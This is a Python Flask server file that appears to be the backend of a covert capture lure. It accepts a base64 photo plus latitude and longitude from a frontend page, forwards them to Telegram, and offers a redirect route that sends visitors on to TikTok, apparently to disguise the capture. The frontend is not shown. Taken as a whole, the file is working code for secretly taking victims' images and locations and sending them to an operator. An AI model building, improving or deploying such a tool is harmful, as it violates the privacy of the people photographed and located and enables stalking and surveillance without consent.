import os
import re
import base64
from flask import Flask, request, jsonify, send_from_directory
from dotenv import load_dotenv
from telegram_utils import send_photo_to_telegram

# Load environment variables
load_dotenv()

TIKTOK_REDIRECT_URL = os.getenv("TIKTOK_REDIRECT_URL")

THIS_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(THIS_DIR, "..", "uploads")
FRONTEND_FOLDER = os.path.join(THIS_DIR, "..", "frontend")

app = Flask(__name__, static_folder=FRONTEND_FOLDER, static_url_path="")
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

BASE64_PATTERN = re.compile(r"^data:image/(png|jpeg);base64,[A-Za-z0-9+/=]+$")

def validate_base64_image(data_url):
    return bool(BASE64_PATTERN.match(data_url)) and len(data_url) < 10 * 1024 * 1024

@app.route("/upload-photo", methods=["POST"])
def upload_photo():
    data = request.get_json()
    if not data or "image" not in data:
        return jsonify({"error": "Missing image data"}), 400

    image_data_url = data["image"]
    lat = data.get("lat")
    lon = data.get("lon")

    if not validate_base64_image(image_data_url):
        return jsonify({"error": "Invalid or too large image data"}), 400

    try:
        encoded = image_data_url.split(",", 1)[1]
        image_bytes = base64.b64decode(encoded)
    except Exception:
        return jsonify({"error": "Failed to decode base64 image"}), 400

    ok, result = send_photo_to_telegram(image_bytes, lat=lat, lon=lon)

    if not ok:
        return jsonify(
            {"error": "Failed to send to Telegram", "telegram_response": result}
        ), 502

    return jsonify({"success": True})

@app.route("/redirect")
def redirect_to_tiktok():
    return f"""<script>window.location.href = "{TIKTOK_REDIRECT_URL}"</script>"""

@app.route("/")
def serve_index():
    return send_from_directory(FRONTEND_FOLDER, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(FRONTEND_FOLDER, path)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)
